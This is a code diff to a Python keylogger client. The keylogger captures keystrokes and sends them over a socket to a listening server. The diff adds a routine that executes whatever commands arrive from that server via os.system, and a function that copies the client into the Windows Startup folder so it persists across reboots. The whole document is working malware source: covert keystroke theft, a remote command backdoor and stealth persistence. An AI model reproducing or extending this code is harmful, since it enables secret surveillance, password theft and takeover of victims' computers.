@@ -1,4 +1,5 @@
-from pynput.keyboard import Listener#koi
+from pynput.keyboard import Listener
+from os import system, getenv, getlogin
 import socket
 from pickle import dumps
 Header = 10
@@ -12,19 +13,27 @@ class Global:
 class Socket:
 
     connection = False
-
-    def __init__(self):
-        self.connect_to_server()
+    cmd_received = False
 
     def connect_to_server(self):
         try:
             self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.active_socket.settimeout(1)
             self.active_socket.connect((socket.gethostname(), 50000))
             Socket.connection = True
             print("Connection established")
         except (ConnectionRefusedError, TimeoutError, socket.error):
             Socket.connection = False
             print("No connection established!")
+
+    def receive_command(self):
+        try:
+            cmd = self.active_socket.recv(64)
+            cmd = cmd.decode()
+            system(cmd)
+        except socket.timeout:
+            print("timeout")
+            Socket.cmd_received = False
 
     def send_char(self, char):
         char = dumps(char)
@@ -63,16 +72,29 @@ def safe_key_press(key):
     key = str(key).replace("'", "")
     Global.key_array.append(key)
     Global.i += 1
-    if Global.i == 20:
+    if Global.i == 50:
         Global.i = 0
         return False
 
 
+def copy_to_startup(file_name):
+    file_name = "file.pyw"
+    path = str(getenv("SystemDrive") + "\\Users\\" + getlogin() + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\" + file_name)
+    print(path)
+    with open(path, "w+")as f:
+        with open("blanc_client.txt", "r")as x:
+            blanc = x.read()
+        f.write(blanc)
+
+
 connection_established = Socket()
+copy_to_startup("wasd")
 while True:
     if not Socket.connection:
         connection_established.connect_to_server()
 
+    if not Socket.cmd_received:
+        connection_established.receive_command()
     if Socket.connection and not Global.key_array:
         with Listener(on_press=no_safe_key_press)as f:
             f.join()
@@ -83,7 +105,5 @@ while True:
     elif not Socket.connection:
         with Listener(on_press=safe_key_press)as f:
             f.join()
-        Global.key_array.append("[Lost Objectives]")
-
-
+        Global.key_array.append("Lost")
 
